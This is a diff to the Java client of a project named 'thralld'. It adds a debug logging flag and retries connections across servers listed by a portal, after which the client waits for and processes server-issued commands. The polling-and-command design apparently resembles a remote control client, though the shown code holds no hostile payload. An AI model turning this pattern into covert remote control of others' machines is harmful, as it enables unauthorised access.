@@ -8,6 +8,7 @@ import java.net.UnknownHostException;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.util.logging.Level;
 
 import com.thralld.common.aobjects.ClientCommandHandler;
 import com.thralld.common.aobjects.Command;
@@ -44,11 +45,13 @@ public class ClientMain
 	private static final String DEF_URL_SERVER_LIST = "/Users/m4kh1ry/workdir/thralld/sources/thralld_common/files/alexa_25000";
 	private static final String DEF_NET_CONNECTIVITY_CHECK_TIMEOUT = "2000";
 	private static final String DEF_SERVER_PORTAL_SITE = "http://machiry.org/error.php";
+	private static final String DEF_DEBUG = "0";
 	
 	private static final String SERVER_POLL_TIME_PROPERTY_NAME = "server_poll_time";
 	private static final String URL_SERVER_LIST_PROPERTY_NAME = "internet_server_list";
 	private static final String NET_CONNECTIVITY_TIMEOUT_PROPERTYNAME = "net_conn_time";
 	private static final String SERVER_PORTAL_PROPERTY_NAME = "server_portal";
+	private static final String DEBUG_PROPERTY_NAME = "debug";
 	
 	/**
 	 * @param args
@@ -63,6 +66,7 @@ public class ClientMain
 		String internetConnServerList = null;
 		int netConnectivityTimeout = 0;
 		String serverPortalURL = "";
+		boolean isDebug = false;
 		
 
 		//Read the properties from property file.
@@ -91,8 +95,23 @@ public class ClientMain
 		tempVal = PropertyParser.readProperty(propertiesFilePath, SERVER_PORTAL_PROPERTY_NAME, DEF_SERVER_PORTAL_SITE);
 		serverPortalURL = tempVal;
 		
-		//Do initialization
-		Logger.initialize("thralld_client:"+InetAddress.getLocalHost().getHostName() +" Starting at:" + (new Date()).toString());
+		tempVal = PropertyParser.readProperty(propertiesFilePath, DEBUG_PROPERTY_NAME, DEF_DEBUG);
+		if(!GenericUtilities.isInteger(tempVal))
+		{
+			tempVal = DEF_DEBUG;
+		}
+		isDebug = Integer.parseInt(tempVal) != 0;
+		//Do log initialization
+		if(isDebug)
+		{
+			Logger.initialize("thralld_client:"+InetAddress.getLocalHost().getHostName() +" Starting at:" + (new Date()).toString(),Level.ALL);
+		}
+		else
+		{
+			Logger.initialize("thralld_client:"+InetAddress.getLocalHost().getHostName() +" Starting at:" + (new Date()).toString(),Level.SEVERE);
+		}
+		INetworkInterface networkInterface = new TCPNetworkImplementation();
+		ConnectionSpecification serverConnSpecification = null;
 		while(true)
 		{
 			//1.Check for Internet connectivity
@@ -100,31 +119,35 @@ public class ClientMain
 			{
 				Thread.sleep(netConnectivityTimeout);
 			}
-			
-			//2. Get list of available servers from portal.
-			List<PortalServerInfo> availableSerInfos = new ArrayList<PortalServerInfo>();
-			while(availableSerInfos.size() == 0)
+			NetworkConnection serverConnection = null;
+			while(serverConnection == null)
 			{
-				try
+
+				//2. Get list of available servers from portal.
+				List<PortalServerInfo> availableSerInfos = new ArrayList<PortalServerInfo>();
+				while(availableSerInfos.size() == 0)
 				{
-					Thread.sleep(serverPollTime);
+					try
+					{
+						Thread.sleep(serverPollTime);
+					}
+					catch(Exception e)
+					{
+						Logger.logException("Problem occured while polling", e);
+					}
+					List<PortalServerInfo> currServInfo = PortalCommunicator.getServerList(serverPortalURL);
+					availableSerInfos.addAll(currServInfo);
 				}
-				catch(Exception e)
+				for(int i=0;(i<availableSerInfos.size()) && (serverConnection == null);i++)
 				{
-					Logger.logException("Problem occured while polling", e);
+					//3. Select a server
+					PortalServerInfo targetServerInfo = availableSerInfos.get(i);
+					//4. Connect to the server
+					String[] connParams = new String[]{null,null,targetServerInfo.serverNetworkName,targetServerInfo.serverNetworkPort};
+					serverConnSpecification = TCPConnectionSpecification.getConnectionSpecification(connParams);
+					serverConnection = networkInterface.openConnection(serverConnSpecification);
 				}
-				List<PortalServerInfo> currServInfo = PortalCommunicator.getServerList(serverPortalURL);
-				availableSerInfos.addAll(currServInfo);
 			}
-			
-			//3. Select a server
-			PortalServerInfo targetServerInfo = availableSerInfos.get(0);
-	
-			//4. Connect to the server
-			INetworkInterface networkInterface = new TCPNetworkImplementation();
-			String[] connParams = new String[]{null,null,targetServerInfo.serverNetworkName,targetServerInfo.serverNetworkPort};
-			ConnectionSpecification serverConnSpecification = TCPConnectionSpecification.getConnectionSpecification(connParams);
-			NetworkConnection serverConnection = networkInterface.openConnection(serverConnSpecification);
 			
 			//5. Process commands.
 			while(true)
@@ -142,6 +165,7 @@ public class ClientMain
 						else
 						{
 							Logger.logError("Problem occured while sending available to server for command:"+Integer.toString(toExecCommand.commandId));
+							Logger.logError("Looks like server closed the connection");
 							//We exit here, because we are no sure if server is up.
 							//We try and connect to other servers.
 							break;
